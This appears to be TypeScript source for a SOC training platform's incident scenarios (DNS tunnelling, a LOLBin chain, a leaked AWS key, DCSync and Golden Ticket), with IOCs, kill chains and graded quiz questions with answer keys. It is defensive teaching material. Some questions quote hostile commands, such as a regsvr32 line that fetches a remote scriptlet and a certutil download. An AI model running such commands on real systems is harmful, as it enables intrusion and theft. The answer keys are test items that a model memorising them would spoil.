    attack_kind: "c2_dns_tunneling",
    briefing: "Microsoft Sentinel fired a DNS query-volume anomaly on WS-ENG-3301 at 14:06 - the host is far above its own baseline. Defender for Endpoint has attached a process name to the traffic, and the firewall logged port 53 traffic leaving the network toward an unfamiliar external address.",
    narrative: `An attacker with an interactive shell in a.jones's session on WS-ENG-3301 (cmd.exe under explorer.exe) ran an encoded PowerShell command that downloaded update.exe from 193.42.36.58 into C:\\Windows\\Temp and started it with a domain and a shared secret on its command line. The client opened a covert C2 channel over DNS, encoding all communication as base32 labels under the attacker-controlled domain nexus-update-svc.xyz; the corporate resolver recursed every query out to the attacker's name server. Commands came back in DNS TXT answers: whoami /all && net user ran at 14:10, and vault-export.csv was copied to a Temp file (cred_export.dat, 29,184 bytes). The client then sent a credential line and the file out through 247 sequential queries in about 4 minutes - each label is capped at 63 bytes and the whole query name at 255, so packing several labels into one name carries only about 120 bytes of decoded data per query.`,
    learning_objectives: [
      "Recognize DNS tunneling indicators: high-entropy subdomains, long subdomain names, TXT record C2",
      "Understand why volume (847 queries/min vs. baseline 23) is a key detection signal",
      "Correlate PowerShell download → DNS volume spike → TXT record commands → data exfiltration chunks",
      "Identify how base32/base64 encoding is used to hide data in DNS labels",
      "Know what a DNS tunnel looks like in endpoint and resolver logs (Sysmon Event ID 22, the resolver's own record, the process that asked)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),             phase: "Execution",        action: "Encoded PowerShell downloads update.exe from 193.42.36.58 into C:\\Windows\\Temp (T1105)" },
      { ts: T(20_000),        phase: "Execution",        action: "update.exe starts with --dns nexus-update-svc.xyz on its command line" },
      { ts: T(3 * MIN),       phase: "C2 Establishment", action: "First tunnel query from update.exe: three 63-character base32 labels under data.nexus-update-svc.xyz (T1071.004)" },
      { ts: T(6 * MIN),       phase: "C2 Active",        action: "847 DNS queries in 60 seconds - Sentinel volume anomaly against a baseline of 23 per minute" },
      { ts: T(10 * MIN),      phase: "Command & Control", action: "C2 command delivered in a DNS TXT answer (encoded: whoami /all, net user); cmd.exe runs it as a child of update.exe" },
      { ts: T(12 * MIN + 40_000), phase: "Collection",   action: "cmd.exe child of update.exe copies vault-export.csv to cred_export.dat (29,184 bytes) in a.jones's Temp folder" },
      { ts: T(14 * MIN),      phase: "Exfiltration",     action: "A credential line, base32-encoded in a DNS subdomain, is sent first" },
      { ts: T(18 * MIN),      phase: "Exfiltration",     action: "247 queries with distinct long subdomains in about 4 minutes - the 29 KB file leaves over DNS" },
    ],
    questions: [
      {
        id: "dns_q1_indicators",
        prompt: "The Sysmon Event ID 22 records from WS-ENG-3301 are the primary evidence. Which combination of fields inside those records is the tunnelling indicator?",
        kind: "single",
        options: [
          { value: "long_label_plus_txt", label: "63-character encoded labels (three per name) and TXT lookups, all from one image in C:\\Windows\\Temp" },
          { value: "nxdomain_responses", label: "NXDOMAIN was returned for every name the workstation asked the resolver to look up" },
          { value: "udp_port_53", label: "The lookups travelled over UDP port 53 to the internal corporate resolver on 10.10.1.1" },
          { value: "aaaa_alongside_a", label: "AAAA record lookups were issued alongside the ordinary A record lookups by the host" },
        ],
        answer: "long_label_plus_txt",
        xp: 50,
        explanation:
          "Sysmon 22 gives you QueryName, QueryResults and - critically - Image. Three 63-character random-looking labels, TXT lookups, and an image path of C:\\Windows\\Temp\\update.exe are three independent oddities in one record. 'nxdomain_responses' is not what the logs show: QueryStatus is 0 and answers came back, and in any case a burst of NXDOMAIN is routine (search-suffix expansion, typos). 'udp_port_53' describes every DNS query on the network including the benign baseline, so it discriminates nothing. 'aaaa_alongside_a' is normal dual-stack behaviour - the baseline rows themselves show both A and AAAA lookups from this host.",
      },
      {
        id: "dns_q2_volume",
        prompt: "Sentinel counted 847 queries in 60 seconds against this host's 23-per-minute baseline. Why is that ratio a more durable detection than blocking the domain nexus-update-svc.xyz?",
        kind: "single",
        options: [
          { value: "volume_is_intrinsic", label: "Domains are cheap to rotate, but any DNS tunnel must send many queries to move data" },
          { value: "ttl_forces_repeats", label: "A very short record TTL forces the recursive resolver to repeat each lookup many times" },
          { value: "entropy_is_useless", label: "Subdomain entropy is the same for CDN hostnames, so only raw counts can be trusted" },
          { value: "only_rcode_logged", label: "A resolver can only measure the NXDOMAIN share of traffic, not the names requested" },
        ],
        answer: "volume_is_intrinsic",
        xp: 75,
        explanation:
          "Volume is a property of the technique, not of the infrastructure: a DNS label carries only tens of bytes, so moving anything meaningful forces thousands of queries. The attacker can register a new domain tomorrow, but cannot make the tunnel quiet. 'ttl_forces_repeats' confuses caching of *answers* with generation of *queries* - the client emits a new unique name per chunk, so TTL is irrelevant. 'entropy_is_useless' overstates a real caveat: CDN hostnames are indeed high-entropy, but this host's baseline entropy is 2.1 against encoded labels, so entropy still discriminates - it is just noisier than volume. 'only_rcode_logged' is false; the resolver logs the full QueryName, which is exactly where the encoded payload sits.",
      },
      {
        id: "dns_q3_encoding",
        prompt: "In evt_dns_05_exfil_start the label MEXGU33OMVZUA3TFPBQWG33SOAXGG33NHJJXA4TJNZTTEMBSGYQQ decodes (base32) to a.jones@nexacorp.com:Spring2026!. Why must the attacker chunk a file across hundreds of such queries instead of sending it in one?",
        kind: "single",
        options: [
          { value: "label_63_bytes", label: "A label is capped at 63 bytes and the whole name at 255, so each query carries only about 100-120 decoded bytes" },
          { value: "base64_padding", label: "Base64 padding is illegal in DNS names, which caps every encoded label at only 32 bytes" },
          { value: "udp_512_cap", label: "A DNS query may not exceed 512 bytes total, which limits each label to 128 bytes" },
          { value: "txt_carries_only", label: "Only TXT records are permitted to carry encoded payloads, and TXT is response-only" },
        ],
        answer: "label_63_bytes",
        xp: 75,
        explanation:
          "The wire format decides it: a label is at most 63 bytes and the whole name at most 255, and base32 expands data by 8/5 before it is even placed there - so roughly 120 bytes of real data per query when three full labels are used, hence 247 queries for a 29 KB file. 'base64_padding' starts from a true fact (the '=' character is not a legal hostname character, which is why tunnels strip it or prefer base32) but invents a 32-byte cap that does not exist. 'udp_512_cap' cites a real limit on the whole classic DNS message, not on a label, and EDNS0 raises it anyway - it is not the binding constraint here. 'txt_carries_only' has the direction backwards: outbound data rides in the query *name*, and TXT is used for the inbound command channel, as evt_dns_04_txt_c2 shows.",
      },
      {
        id: "dns_q4_attribution",
        prompt: "Select the TWO facts, each drawn from a different event, that tie the DNS tunnel specifically to the PowerShell download rather than to a browser or a misconfigured client.",
        kind: "multi",
        options: [
          { value: "image_path_matches", label: "Sysmon's Image field and the EDR records both name C:\\Windows\\Temp\\update.exe" },
          { value: "hash_matches", label: "The SHA256 of the file powershell.exe wrote equals InitiatingProcessSHA256 on the query events" },
          { value: "corporate_resolver", label: "The queries were sent to the corporate resolver rather than to an external DNS server" },
          { value: "sequential_chunks", label: "Sentinel counted 247 queries with distinct long subdomains from the host over four minutes" },
        ],
        answer: ["image_path_matches", "hash_matches"],
        xp: 100,
        explanation:
          "Attribution needs a process identity carried across sources. evt_dns_01c_write records the file written to C:\\Windows\\Temp\\update.exe by powershell.exe, with its SHA256; evt_dns_01d_run shows powershell.exe starting it (pid 4488); evt_dns_process_queries records the same path and the same hash as InitiatingProcess on the traffic to the resolver, and Sysmon's Image agrees - that is the link. 'corporate_resolver' is exactly what a browser does too: nearly all endpoints send DNS to the internal resolver, so it says nothing about which process. 'sequential_chunks' does prove the traffic is machine-generated exfiltration, but it comes from a SIEM correlation record that carries no process identity at all, so it cannot bind the tunnel to update.exe.",
      },
    ],
  };
}

// =========================================================================
// Scenario 9: Living-off-the-Land (LOLBins) - certutil → regsvr32 → Persistence
// =========================================================================

export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundle {
  const { title, events, T, MIN, payloadHash, certutilHash, bitsPayloadHash, docmHash, c2Ip, mailIp } = lolBinsScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: "pkg-mirror-eu.ru",                                  reputation: "malicious", tags: ["external"] },
    { type: "domain", value: "cdn-winupd.ru",                                     reputation: "malicious", tags: ["external"] },
    { type: "domain", value: "nexacorp-portal.ru",                                reputation: "malicious", tags: ["sender-domain"] },
    { type: "email",  value: "hr-updates@nexacorp-portal.ru",                     reputation: "malicious", tags: ["sender"] },
    { type: "ip",     value: mailIp,                                              reputation: "malicious", tags: ["external"] },
    { type: "ip",     value: c2Ip,                                                reputation: "malicious", tags: ["external"] },
    { type: "sha256", value: docmHash,                                            reputation: "malicious", tags: ["attachment"] },
    { type: "sha256", value: certutilHash,                                        reputation: "malicious", tags: ["download"] },
    { type: "sha256", value: payloadHash,                                         reputation: "malicious", tags: ["dll"] },
    { type: "sha256", value: bitsPayloadHash,                                     reputation: "malicious", tags: ["file"] },
    { type: "url",    value: "http://pkg-mirror-eu.ru/update.exe",                reputation: "malicious", tags: ["download"] },
    { type: "url",    value: "http://cdn-winupd.ru/tpl/upd.sct",                  reputation: "malicious", tags: ["scriptlet"] },
    { type: "url",    value: "http://cdn-winupd.ru/stage2.ps1",                   reputation: "malicious", tags: ["script"] },
    { type: "url",    value: "http://cdn-winupd.ru/persistence.exe",              reputation: "malicious", tags: ["download"] },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "TA-GHOSTSHELL (APT Group)",
    attack_kind: "lolbins_defense_evasion",
    briefing: "Microsoft Sentinel fired a rare-command-line detection on WS-HR-1133 (s.patel) at 11:05, and the firewall logged outbound HTTP from the same host to two external addresses in that window. A mail delivery to this user is also queued for review.",
    narrative: `A phishing email delivered a macro-enabled document to an HR workstation. When s.patel opened HR_Policy_Update.docm from Outlook, WINWORD.EXE spawned cmd.exe and began a LOLBin chain: certutil downloaded the initial payload (bypassing download controls since certutil is a trusted Windows binary), regsvr32 executed a remote COM scriptlet (Squiblydoo - bypasses AppLocker), mshta loaded a second-stage VBScript from URL, wmic performed process discovery, bitsadmin built a BITS job with a notify command line to pull down a persistence binary, rundll32 loaded an unsigned DLL from a user-writable path, and finally schtasks created a scheduled task, running in the user's context, that executes the dropped binary every 5 minutes. The task ran at 11:25 and again at 11:30, and each run called out to the attacker's server. Every step used built-in, trusted Windows binaries to evade detection.`,
    learning_objectives: [
      "Identify the 7 most commonly abused LOLBins: certutil, regsvr32, mshta, wmic, bitsadmin, rundll32, schtasks",
      "Understand why each LOLBin is suspicious in these contexts (certutil downloading from internet, regsvr32 /i:<URL>, etc.)",
      "Recognize the Squiblydoo technique (regsvr32 COM scriptlet execution) and AppLocker bypass",
      "Detect LOLBin chain execution: suspicious parent-child process relationships",
      "Identify persistence via BITS jobs (a persistent job queue with a notify command) and scheduled tasks (recurring execution)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(-2 * MIN), phase: "Initial Access",              action: "Phishing email 'HR_Policy_Update.docm' delivered to s.patel (T1566.001); opened from Outlook at 10:59, WINWORD.EXE starts cmd.exe" },
      { ts: T(0),        phase: "Initial Access / Download",  action: "certutil.exe downloads update.exe from pkg-mirror-eu.ru (T1105); Defender detects it and does not remediate" },
      { ts: T(4 * MIN),  phase: "Stealth",            action: "regsvr32.exe Squiblydoo - remote COM scriptlet bypasses AppLocker (T1218.010)" },
      { ts: T(5 * MIN + 10_000), phase: "Detection",  action: "Sentinel: 'Rare certutil command line' for s.patel on WS-HR-1133" },
      { ts: T(7 * MIN),  phase: "Execution",                  action: "mshta.exe loads stage-2 VBScript from attacker URL; hidden PowerShell fetches stage2.ps1 (T1218.005)" },
      { ts: T(10 * MIN), phase: "Discovery",                  action: "wmic.exe enumerates all running processes (T1057)" },
      { ts: T(13 * MIN), phase: "Persistence / Download",     action: "bitsadmin builds the BITS job NexaCorpUpdate (/create, /addfile, /SetNotifyCmdLine, /resume); the BITS service downloads svchost_update.exe (T1197)" },
      { ts: T(16 * MIN), phase: "Stealth",            action: "rundll32.exe loads unsigned attacker DLL C:\\Users\\Public\\srvhost.dll and it calls out on TCP/443 (T1218.011)" },
      { ts: T(20 * MIN), phase: "Persistence",                action: "schtasks.exe creates user-context task 'NexaCorpHealthCheck' - every 5 minutes (T1053.005)" },
      { ts: T(25 * MIN), phase: "Command and Control",        action: "The task starts svchost_update.exe at 11:25 and 11:30; each run connects to the attacker's server on TCP/443 (T1071.001)" },
    ],
    questions: [
      {
        id: "lol_q1_signed_binary",
        prompt: "Every executable in this chain ships with Windows and carries a valid Microsoft signature. Given that, what makes evt_lol_01_certutil malicious?",
        kind: "single",
        options: [
          { value: "flags_and_destination", label: "certutil ran -urlcache -split -f to pull an EXE from an external host over HTTP" },
          { value: "certutil_unsigned", label: "The certutil.exe image on this workstation was unsigned and failed its signature check" },
          { value: "hash_matches_payload", label: "certutil.exe's own SHA256 is identical to the SHA256 of the file it just downloaded" },
          { value: "wrong_folder", label: "certutil.exe was launched out of C:\\Users\\Public instead of its System32 location" },
        ],
        answer: "flags_and_destination",
        xp: 50,
        explanation:
          "A LOLBin is judged on behaviour, never on the file. certutil is a certificate utility; -urlcache -split -f turns it into a downloader, and the destination is an uncategorised .ru host - the command line and the network peer are the evidence. 'certutil_unsigned' contradicts the record and misses the lesson: the binary is the genuine signed OS component, which is precisely why it evaded download controls. 'hash_matches_payload' is impossible - one SHA256 identifies one file, and the process row for certutil.exe and the file-write row for update.exe carry two distinct hashes. 'wrong_folder' is contradicted by FolderPath, which reads C:\\Windows\\System32; a LOLBin runs from its normal home.",
      },
      {
        id: "lol_q2_squiblydoo",
        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
        kind: "single",
        options: [
          { value: "signed_host_interprets", label: "An allow-listed signed binary interprets the remote scriptlet, so no new EXE is started" },
          { value: "u_flag_unregisters", label: "The /u flag unregisters the DLL, which also strips it out of the AppLocker rule set" },
          { value: "sct_not_covered", label: "AppLocker never evaluates .sct files at all, because it classifies scriptlets as image data" },
          { value: "http_is_exempt", label: "AppLocker only evaluates files on local disk, so anything fetched over HTTP is exempt" },
        ],
        answer: "signed_host_interprets",
        xp: 75,
        explanation:
          "This is Squiblydoo (T1218.010). AppLocker decides whether *a process image* may run; regsvr32.exe is a Microsoft binary that virtually every policy permits, and the attacker's code never becomes a process image - scrobj.dll fetches the scriptlet and executes it inside regsvr32. 'u_flag_unregisters' misreads the switch: /u with /i still invokes the scriptlet's unregister entry point, and AppLocker policy is machine configuration that regsvr32 cannot edit. 'sct_not_covered' is close to a real gap but wrong on mechanism - AppLocker does have script rules; they are bypassed because the scriptlet is never written to disk as a file for those rules to evaluate. 'http_is_exempt' invents an exemption; the location of the payload is irrelevant when the evaluated image is an approved one.",
      },
      {
        id: "lol_q3_parent_child",
        prompt: "Follow InitiatingProcessFileName and the parent PIDs across evt_lol_01 through evt_lol_07. Which reconstruction of the execution chain is supported by the records?",
        kind: "single",
        options: [
          { value: "regsvr_to_mshta_to_ps", label: "regsvr32 (5512) spawned mshta, whose PowerShell (6200) then parented wmic and bitsadmin" },
          { value: "cmd_parents_everything", label: "cmd.exe (4420) is the recorded direct parent of every process in the chain after certutil" },
          { value: "certutil_spawned_regsvr", label: "certutil (4440) spawned regsvr32 (5512), which is why the two share the same workstation" },
          { value: "schtasks_started_chain", label: "schtasks (7900) launched the earlier stages and then re-registered itself to run as SYSTEM" },
        ],
        answer: "regsvr_to_mshta_to_ps",
        xp: 100,
        explanation:
          "mshta's record names regsvr32.exe (PID 5512) as its initiating process, and its command line launches hidden PowerShell; wmic, bitsadmin, rundll32 and schtasks all then record powershell.exe PID 6200 as initiator. That is the chain. 'cmd_parents_everything' holds only for the first steps - cmd.exe PID 4420 is the recorded parent of certutil, of update.exe and of regsvr32; from mshta onward the initiator is regsvr32, then PowerShell, not cmd. 'certutil_spawned_regsvr' asserts a link the data denies: regsvr32's parent PID is 4420 (cmd.exe), the same parent certutil has - not certutil's own PID 4440 - and sharing a host is not a parent-child relationship. 'schtasks_started_chain' is chronologically impossible - schtasks runs at T+20, twenty minutes after certutil, and a process cannot parent events that happened before it existed.",
      },
      {
        id: "lol_q4_persistence",
        prompt: "Select the TWO events that give the attacker execution surviving a reboot of WS-HR-1133, and be able to say why the others do not.",
        kind: "multi",
        options: [
          { value: "bits_job", label: "The BITS job NexaCorpUpdate, created with a notify command line, stays in the BITS queue across a restart and re-runs the dropped binary" },
          { value: "schtask_system", label: "The task NexaCorpHealthCheck re-runs the dropped binary every five minutes under the logged-on user" },
          { value: "rundll32_dllmain", label: "rundll32 loading srvhost.dll from C:\\Users\\Public keeps that DLL resident on the host" },
          { value: "wmic_enumeration", label: "wmic process list brief registers a permanent WMI event consumer on the workstation" },
        ],
        answer: ["bits_job", "schtask_system"],
        xp: 75,
        explanation:
          "A BITS job is queued by the BITS service, which keeps the queue on disk and resumes it after a restart (T1197); this one was built with /SetNotifyCmdLine pointing at svchost_update.exe, so the service itself runs the binary when the job completes or errors. (A plain `bitsadmin /transfer` would be a one-shot copy, which is why the attacker used /create, /addfile, /SetNotifyCmdLine and /resume.) A scheduled task is re-registered from disk at boot - here running in the logged-on user's context every five minutes (T1053.005), and the logs prove it: svchost_update.exe starts under the Task Scheduler's service host at 11:25 and again at 11:30. 'rundll32_dllmain' is defence evasion, not persistence: the DLL is loaded into a process, and when that process or the machine dies the execution dies with it - the file remaining on disk is storage, not a trigger. 'wmic_enumeration' confuses two very different wmic uses: process list brief is a read-only discovery query, whereas a permanent WMI subscription requires creating filter and consumer objects under root\\subscription, which appears nowhere in these logs.",
      },
    ],
  };
}

// =========================================================================
// Scenario 10: Leaked AWS Key → IAM Backdoor → S3 Data Theft
// =========================================================================

export function buildCloudKeyLeakS3ExfilScenario(scenarioId = "aws-key-leak-s3-exfil-2026"): ScenarioBundle {
  const { title, events, T, MIN, attackerIp, iamUser, leakedKey, backdoorUser, backdoorKey, s3Bucket, sampleObject, commitSha } = cloudKeyLeakS3ExfilScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",   value: attackerIp,              reputation: "malicious",  tags: ["vps"] },
    { type: "user", value: backdoorUser,            reputation: "malicious",  tags: ["iam-user"] },
    { type: "user", value: iamUser,                 reputation: "suspicious", tags: ["iam-user"] },
    { type: "host", value: s3Bucket,                reputation: "unknown",    tags: ["s3-bucket"] },
    { type: "url",  value: `https://github.com/rocketstack-io/deploy-scripts/blob/${commitSha}/scripts/deploy.sh`, reputation: "suspicious", tags: ["public-repo"] },
    { type: "email", value: "a.levy@rocketstack.io", reputation: "unknown",   tags: ["developer"] },
  ];

  const killchain = [
    { ts: T(-4 * MIN), phase: "Credential Exposure", action: `a.levy pushes scripts/deploy.sh containing ${iamUser}'s access key ${leakedKey} to the public repo rocketstack-io/deploy-scripts` },
    { ts: T(0),        phase: "Detection",           action: "GitHub secret scanning opens alert #42 for the AWS access key (validity: active)" },
    { ts: T(2 * MIN),  phase: "Initial Access",      action: `GetCallerIdentity with ${leakedKey} from ${attackerIp} (Singapore) - the key's first use outside the CI runner` },
    { ts: T(4 * MIN),  phase: "Discovery",           action: "ListBuckets, ListUsers and ListAttachedUserPolicies within 41 seconds" },
    { ts: T(10 * MIN), phase: "Persistence",         action: `CreateUser ${backdoorUser}` },
    { ts: T(11 * MIN), phase: "Persistence",         action: `CreateAccessKey → ${backdoorKey} for ${backdoorUser}` },
    { ts: T(13 * MIN), phase: "Persistence",         action: `AttachUserPolicy AdministratorAccess → ${backdoorUser}` },
    { ts: T(14 * MIN), phase: "Initial Access",      action: `GetCallerIdentity with the new key ${backdoorKey} from ${attackerIp}` },
    { ts: T(16 * MIN), phase: "Detection",           action: `GuardDuty Persistence:IAMUser/AnomalousBehavior on ${iamUser}` },
    { ts: T(17 * MIN + 10_000), phase: "Discovery",  action: `ListObjectsV2 on ${s3Bucket} (prefix exports/) with ${backdoorKey}` },
    { ts: T(18 * MIN), phase: "Collection",          action: `GetObject run against ${s3Bucket} signed with ${backdoorKey} (first object ${sampleObject}, 412 MB)` },
    { ts: T(31 * MIN), phase: "Detection",           action: "GuardDuty Exfiltration:S3/AnomalousBehavior - 1,284 GetObject calls between 09:18 and 09:29" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt: "Which row proves the leaked key was used by someone other than the CI pipeline?",
      kind: "single",
      options: [
        { value: "A", label: "evt_kl_01 - the GitHub secret-scanning alert itself" },
        { value: "B", label: `evt_kl_02 - GetCallerIdentity signed with ${leakedKey} from ${attackerIp}, not the CI runner's egress IP` },
        { value: "C", label: "evt_kl_00 - the PutObject to rocketstack-deploy-artifacts" },
        { value: "D", label: "evt_kl_06 - AttachUserPolicy: the most damaging call, but it comes after the first outside use" },
      ],
      answer: "B",
      xp: 50,
      explanation: "The GitHub alert (evt_kl_01) proves exposure, not use. The baseline (evt_kl_00) shows how the key is normally used: the CI runner's egress IP, the AWS CLI and an S3 upload. evt_kl_02 is the same access key id from a Singapore VPS address, with a scripted-SDK user agent, calling GetCallerIdentity - the first thing anyone runs with a key they just found, to learn whose it is. AttachUserPolicy comes later and is damning, but B is the first proof of outside use.",
    },
    {
      id: "q2",
      prompt: `Which access key signed the S3 GetObject calls (evt_kl_08), and how did that key come to exist?`,
      kind: "single",
      options: [
        { value: "A", label: `${leakedKey} - the leaked CI key, used directly against the bucket` },
        { value: "B", label: `${backdoorKey} - created for ${backdoorUser} by CreateAccessKey (evt_kl_05), called with the leaked key` },
        { value: "C", label: "No key - the bucket was made public and read anonymously" },
        { value: "D", label: "A temporary ASIA session key from AssumeRole" },
      ],
      answer: "B",
      xp: 75,
      explanation: `evt_kl_08's userIdentity is IAMUser ${backdoorUser} with accessKeyId ${backdoorKey}. That id appears exactly once before: in the responseElements of CreateAccessKey (evt_kl_05), whose caller was ${leakedKey} from ${attackerIp}. Pivoting on the key id is how you chain the S3 read back to the leak - and it is why deactivating only the leaked key would not have stopped the download.`,
    },
    {
      id: "q3",
      prompt: "Which FOUR actions are required to contain and scope this incident? (Select all that apply)",
      kind: "multi",
      options: [
        { value: "A", label: `Deactivate and then delete access key ${leakedKey}; issue the CI pipeline a new credential (preferably a role, not a long-term key)` },
        { value: "B", label: `Deactivate ${backdoorKey}, detach AdministratorAccess and delete the IAM user ${backdoorUser}` },
        { value: "C", label: `Search CloudTrail for every call by both keys and from ${attackerIp} (management AND S3 data events) to scope what was read or changed` },
        { value: "D", label: "Remove the key from the repo history and treat the commit as public forever - removal does not un-leak it" },
        { value: "E", label: "Delete the CloudTrail trail to stop the attacker reading it" },
        { value: "F", label: "Make the bucket public-read-blocked only - the IAM changes are noise" },
      ],
      answer: ["A", "B", "C", "D"],
      xp: 100,
      explanation: `(A) closes the original door; (B) closes the door the attacker built - ${backdoorUser} has AdministratorAccess and its own long-term key, so it survives (A). (C) scopes the breach: GuardDuty counted 1,284 GetObject calls, and the object keys in the S3 data events (customers_full.csv.gz for May and April, the billing invoices, the KYC batches) define what was taken, and therefore the notification duties. (D) matters because the commit is public and scanned continuously; rotating is the fix, history rewriting is hygiene. (E) destroys your only evidence. (F) misreads the incident: the bucket was never public - the reads were signed by an IAM user the attacker created.`,
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Financially motivated actor scanning public repos for cloud keys",
    attack_kind: "cloud_credential_leak",
    briefing: "GitHub secret scanning opened an alert at 09:00 for an AWS access key in the public repo rocketstack-io/deploy-scripts. Since then GuardDuty has raised two findings on the same account. Scope the account.",
    narrative: `At 08:56, DevOps engineer a.levy pushed a deploy script to a public GitHub repository with the CI user's long-term access key embedded in it. GitHub's secret scanning flagged it four minutes later - but two minutes after that the key was already in use from a Singapore VPS: first GetCallerIdentity, then a quick look at the account's buckets, IAM users and the CI user's policies. Ten minutes in, the same key created a new IAM user, gave it its own access key and attached AdministratorAccess. (AWS normally attaches its compromised-key quarantine policy to a user whose key is exposed publicly; here it did not stop these calls, which is itself a finding for the account's key-exposure automation.) From then on the leaked key was no longer needed: the new user's key listed the production customer-data bucket and read more than a thousand objects from it, several of them hundreds of megabytes, before GuardDuty's S3 finding fired. Your job: prove the key was used, follow the key ids from the leak to the bucket, and define containment that removes BOTH the leaked credential and the one the attacker built.`,
    learning_objectives: [
      "Tell exposure (a secret-scanning alert) from use (CloudTrail calls signed with that key from a new IP)",
      "Pivot on access key ids: CreateAccessKey responseElements → the key in later userIdentity blocks",
      "Recognise IAM persistence in AWS: CreateUser + CreateAccessKey + AttachUserPolicy",
      "Read S3 data events and GuardDuty S3 findings to scope what was taken",
      "Contain a leaked-key incident completely: both keys, the created user, and the scoping search",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events,
    iocs,
    killchain,
    questions,
  };
}

// =========================================================================
// Scenario 11: DCSync → Golden Ticket (Domain Dominance)
// =========================================================================

export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): ScenarioBundle {
  const { title, events, T, MIN, attackerIp, dc01, dc02, adminEmail, mimikatzHash, ntdsDitHash, ditPath } = dcSyncScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: attackerIp,                                      reputation: "malicious",  tags: ["external", "netherlands"] },
    { type: "user",   value: adminEmail,                                       reputation: "suspicious", tags: ["it-admin"] },
    { type: "host",   value: dc01,                                             reputation: "unknown", tags: ["domain-controller"] },
    { type: "host",   value: dc02,                                             reputation: "unknown", tags: ["domain-controller"] },
    { type: "sha256", value: mimikatzHash,                                     reputation: "malicious",  tags: ["file"] },
    { type: "user",   value: "svc-monitoring-prod@nexacorp.com",               reputation: "malicious",  tags: ["new-account"] },
    { type: "sha256", value: ntdsDitHash,                                      reputation: "malicious",  tags: ["file"] },
    { type: "host",   value: ditPath,                                          reputation: "malicious",  tags: ["file-path"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Initial Access",    action: "Attacker RDPs to DC01 from Netherlands IP 176.97.210.93 with it.admin's credentials, NTLM, at 22:15 UTC (01:15 local) (T1021.001)" },
    { ts: T(110_000),  phase: "Credential Access", action: "A renamed Mimikatz binary (wdhelper.exe) copied into it.admin's AppData and run from cmd.exe - Defender detects it at 22:18 but takes no action" },
    { ts: T(5 * MIN),  phase: "Defense Impairment",   action: "Windows Defender real-time protection disabled via registry (T1685, formerly T1562.001)" },
    { ts: T(8 * MIN),  phase: "Credential Access", action: "DCSync attack: wdhelper.exe runs lsadump::dcsync for krbtgt; DS-Replication-Get-Changes(-All) rights exercised, Event 4662 (T1003.006)" },
    { ts: T(13 * MIN), phase: "Credential Access", action: "Golden Ticket forged offline from the stolen krbtgt hash - a TGT the KDC never issued or recorded, then used to request a 4769 service ticket (RC4) with no preceding 4768 (T1558.001)" },
    { ts: T(17 * MIN), phase: "Lateral Movement",  action: "Forged ticket used from DC01 to log on to DC02 over the network (T1550.003)" },
    { ts: T(20 * MIN), phase: "Credential Access", action: "ntdsutil.exe IFM writes a copy of the AD database (ntds.dit, 2.7 GB) and the SYSTEM hive to C:\\Windows\\Temp\\ifm (T1003.003)" },
    { ts: T(23 * MIN), phase: "Persistence",       action: "Shadow admin account svc-monitoring-prod created and added to Domain Admins (T1136.001)" },
    { ts: T(25 * MIN), phase: "Defense Impairment",   action: "Security event log cleared with wevtutil (Event 1102) - covering tracks on DC01 (T1685.005, formerly T1070.001)" },
    { ts: T(27 * MIN + 5_000), phase: "Exfiltration", action: "The RDP session closes after 27 minutes with about 2.9 GB sent toward the client (T1048)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q_dc_01",
      prompt: "Event ID 4662 appears with Properties {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} and {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} on a Domain Controller, triggered by a non-DC user account. What does this indicate?",
      kind: "single",
      options: [
        { value: "dcsync",     label: "DCSync: a replication request used to extract password hashes without touching LSASS" },
        { value: "normal_rep", label: "Routine AD replication between two Domain Controllers using DRSUAPI GetNCChanges calls" },
        { value: "kerberoast", label: "Kerberoasting: service ticket requests with an RC4 downgrade for offline cracking" },
        { value: "ldap_enum",  label: "LDAP enumeration: BloodHound/SharpHound collecting domain objects and their ACLs" },
      ],
      answer: "dcsync",
      xp: 75,
      explanation: "GUIDs {1131f6aa} (DS-Replication-Get-Changes) and {1131f6ad} (DS-Replication-Get-Changes-All) are the control-access rights a replication client must exercise to pull directory changes including secret attributes such as password hashes. (A similar-looking GUID, {1131f6ab}, is DS-Replication-Synchronize, which is not the DCSync pair; {89e95b76} is Get-Changes-In-Filtered-Set, which DCSync tools also request.) When a non-DC user account (not ending in $) triggers Event 4662 with these GUIDs on the domain root object, it is a definitive DCSync attack indicator. Normal DC replication uses machine accounts (e.g., DC01$). Kerberoasting generates Event 4769, not 4662. LDAP enumeration generates Event 4662 on object reads but with different ObjectClass and AccessMask values. The replicated account is not named in a 4662; here it is the wdhelper.exe command line in the Defender for Endpoint process record that shows the target was krbtgt.",
    },
    {
      id: "q_dc_02",
      prompt: "it.admin requests a service ticket (4769) from DC02, and a hunt across both domain controllers finds no 4768 for that account in the preceding 24 hours. What does that combination indicate, and why is it the tell?",
      kind: "single",
      options: [
        { value: "T1558.001", label: "A forged TGT is in play - it was minted offline from the krbtgt hash, so the KDC never issued one and no 4768 exists to find (T1558.001, Golden Ticket)" },
        { value: "T1550.002", label: "The account's NTLM hash is being replayed over SMB, which produces Kerberos service tickets without any prior interactive authentication (T1550.002, Pass-the-Hash)" },
        { value: "T1558.003", label: "A service account with an SPN is being roasted, and the TGS request is the harvest step whose ticket gets cracked offline afterwards (T1558.003, Kerberoasting)" },
        { value: "T1558.002", label: "A service ticket was forged directly using the target service account's own hash, which bypasses the KDC for that one service (T1558.002, Silver Ticket)" },
      ],
      answer: "T1558.001",
      xp: 75,
